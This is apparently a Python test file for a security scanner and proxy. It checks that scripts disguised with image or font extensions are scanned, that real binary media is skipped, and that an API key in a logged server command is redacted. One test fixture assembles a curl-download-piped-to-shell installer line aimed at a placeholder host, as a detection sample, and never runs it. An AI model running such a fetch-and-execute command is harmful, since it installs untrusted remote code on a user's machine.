"""FR-E8 review: text saved under a media name is scanned, and the proxy's start line
carries no secret from the server command.

A script with a media extension (an installer named like an image) was never read, so a
download piped into a shell in it passed silently; now a media file whose first bytes are
text is scanned like any other file, while real media (binary from its first bytes) is still
skipped silently. The proxy's `started; wrapping:` line printed the server command as
given, so a key passed as an argument reached the log; it is now redacted as debug lines are.
Payloads and secret-shaped values are built at runtime; nothing a test writes is executed.
Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import io
import tempfile
import unittest
from pathlib import Path

from frisk.engine import Skipped, scan_file, scan_path
from frisk.proxy import LaunchError, Proxy

INSTALLER = "#!/bin/sh\n" + "cu" + "rl -sL https://get.example.invalid/i.sh " + "| s" + "h\n"
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"


class TestTextUnderAMediaName(unittest.TestCase):
    def setUp(self) -> None:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name)

    def put(self, name: str, data: bytes) -> Path:
        path = self.root / name
        path.write_bytes(data)
        return path

    def test_a_script_named_like_an_image_is_scanned(self) -> None:
        for name in ("setup.png", "install.PDF", "font.woff2"):
            with self.subTest(name=name):
                result = scan_file(self.put(name, INSTALLER.encode("utf-8")), self.root)
                self.assertEqual([f.rule for f in result.findings], ["rce.pipe_installer"])
                self.assertEqual(result.coverage.skipped, [])

    def test_real_media_is_still_skipped_silently(self) -> None:
        # Binary from its first bytes: a PNG signature, then the same text.
        result = scan_file(self.put("logo.png", PNG_MAGIC + INSTALLER.encode("utf-8")), self.root)
        self.assertEqual(result.findings, [])
        self.assertEqual(result.coverage.skipped, [Skipped("logo.png", "binary", ".png")])
        nul = scan_file(self.put("clip.mp4", b"\x00\x00\x00\x18ftypisom" + INSTALLER.encode("utf-8")), self.root)
        self.assertEqual((nul.findings, nul.coverage.skipped), ([], [Skipped("clip.mp4", "binary", ".mp4")]))

    def test_large_real_media_is_not_a_too_large_finding(self) -> None:
        self.put("photo.jpg", b"\xff\xd8\xff\xe0" + bytes(range(256)) * 16384)  # 4 MiB, over the 2 MiB default
        result = scan_path(str(self.root))
        self.assertEqual(result.findings, [])
        self.assertEqual(result.coverage.skipped, [Skipped("photo.jpg", "binary", ".jpg")])

    def test_large_text_under_a_media_name_blocks_as_too_large(self) -> None:
        self.put("notes.png", INSTALLER.encode("utf-8") * (3 * 2**20 // len(INSTALLER)))
        self.assertEqual([f.rule for f in scan_path(str(self.root)).findings], ["coverage.too_large"])


class TestProxyStartLine(unittest.TestCase):
    def test_a_secret_in_the_server_command_is_redacted(self) -> None:
        key = "sk-" + "a1B2" * 8
        log = io.StringIO()
        missing = "/nonexistent.invalid/bin/server"
        proxy = Proxy([missing, "--api-key=" + key, "serve"], log=log, pins_file=None)
        with self.assertRaises(LaunchError):  # nothing is started
            proxy.run()
        line = log.getvalue().splitlines()[0]
        self.assertNotIn(key, log.getvalue())
        self.assertEqual(line, f"[frisk-proxy] started; wrapping: {missing} --api-key=[REDACTED] serve")


if __name__ == "__main__":
    unittest.main()
